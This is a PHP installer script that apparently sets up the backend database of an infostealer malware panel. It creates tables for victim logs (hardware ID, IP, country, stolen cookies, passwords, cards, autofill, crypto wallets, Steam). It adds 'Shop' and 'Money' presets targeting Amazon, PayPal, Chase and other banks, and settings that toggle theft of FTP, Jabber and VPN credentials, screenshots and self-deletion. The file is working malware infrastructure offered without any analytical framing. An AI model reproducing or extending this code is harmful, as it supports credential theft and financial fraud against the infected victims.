<?php
ini_set('display_errors', 'On');
error_reporting(E_ALL);

if (isset($_GET['submit'])) {
    $dbname = $_GET['dbname'];
    $dbhost = $_GET['dbhost'];
    $dbuser = $_GET['dbuser'];
    $dbpass = $_GET['dbpass'];
    $user = $_GET['name'];
    $pass = $_GET['pass'];

    try {
        $db = new PDO("pgsql:host=$dbhost;port=5432;dbname=$dbname", $dbuser, $dbpass);
    } catch (Exception $e) {
        echo "Connection failed: " . $e->getMessage();
        $db = NULL;
    }

    if ($db) {
        $db->exec("CREATE TABLE IF NOT EXISTS grabber (
            id SERIAL PRIMARY KEY,
            name TEXT NOT NULL,
            folder TEXT NOT NULL,
            pattern TEXT NOT NULL,
            exception TEXT NOT NULL
        );");

        $db->exec("CREATE TABLE IF NOT EXISTS logs (
            id SERIAL PRIMARY KEY,
            userID TEXT NOT NULL,
            hwid TEXT NOT NULL,
            system TEXT NOT NULL,
            ip TEXT NOT NULL,
            country TEXT NOT NULL,
            date TEXT NOT NULL,
            count INTEGER,
            cookie INTEGER,
            pswd INTEGER,
            buildversion TEXT,
            credit INTEGER DEFAULT 0,
            autofill INTEGER DEFAULT 0,
            wallets INTEGER DEFAULT 0,
            checked INTEGER DEFAULT 0,
            comment TEXT NOT NULL,
            preset TEXT,
            steam INTEGER
        );");

        $db->exec("CREATE TABLE IF NOT EXISTS presets (
            id SERIAL PRIMARY KEY,
            name TEXT NOT NULL,
            color TEXT NOT NULL,
            pattern TEXT NOT NULL
        );");

        $db->exec("INSERT INTO presets (name, color, pattern) VALUES
            ('Shop', 'green', 'amazon;ebay;walmart;newegg;apple;bestbuy'),
            ('Money', 'GOLD', 'paypal;chase.com;TD;wells;capitalone;skrill;PayU');");

        $db->exec("CREATE TABLE IF NOT EXISTS tasks (
            id SERIAL PRIMARY KEY,
            name TEXT NOT NULL,
            count INTEGER NOT NULL,
            country TEXT NOT NULL,
            task TEXT NOT NULL,
            preset TEXT NOT NULL,
            params TEXT NOT NULL,
            status INTEGER NOT NULL
        );");

        $db->exec("CREATE TABLE IF NOT EXISTS settings (
            id SERIAL PRIMARY KEY,
            cisLogs TEXT NOT NULL,
            repeatLogs TEXT NOT NULL,
            telegram TEXT NOT NULL,
            history TEXT NOT NULL,
            autocomplete TEXT NOT NULL,
            cards TEXT NOT NULL,
            cookies TEXT NOT NULL,
            passwords TEXT NOT NULL,
            jabber TEXT NOT NULL,
            ftp TEXT NOT NULL,
            screenshot TEXT NOT NULL,
            selfDelete TEXT NOT NULL,
            vpn TEXT NOT NULL,
            grabber TEXT NOT NULL,
            executionTime TEXT NOT NULL
        );");

        $db->exec("INSERT INTO settings (cisLogs, repeatLogs, telegram, history, autocomplete, cards, cookies, passwords, jabber, ftp, screenshot, selfDelete, vpn, grabber, executionTime)
                   VALUES ('on', 'on', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', 'off', '0');");

        $db->exec("CREATE TABLE IF NOT EXISTS usr (
            id SERIAL PRIMARY KEY,
            name TEXT NOT NULL,
            pass TEXT NOT NULL
        );");

        $e = sha($user, $pass);
        $stmt = $db->prepare("INSERT INTO usr (name, pass) VALUES (:name, :pass)");
        $stmt->execute(['name' => $user, 'pass' => $e]);

        $fd = fopen("database.php", 'w');
        $content = "<?php
\$user = \"$dbuser\";
\$password = \"$dbpass\";
\$host = \"$dbhost\";
\$db_name = \"$dbname\";
\$pdoConnection = new PDO(\"pgsql:host=\$host;port=5432;dbname=\$db_name\", \$user, \$password);
?>";
        fwrite($fd, $content);
        fclose($fd);

        header("Location: index.php", true, 301);
    }
}

function sha($user, $p)
{
    $method = 'aes-128-ctr';
    $key = openssl_digest($user, 'SHA256', TRUE);
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($method));
    $crypt = openssl_encrypt($p, $method, $key, 0, $iv) . "::" . bin2hex($iv);
    return $crypt;
}
?>
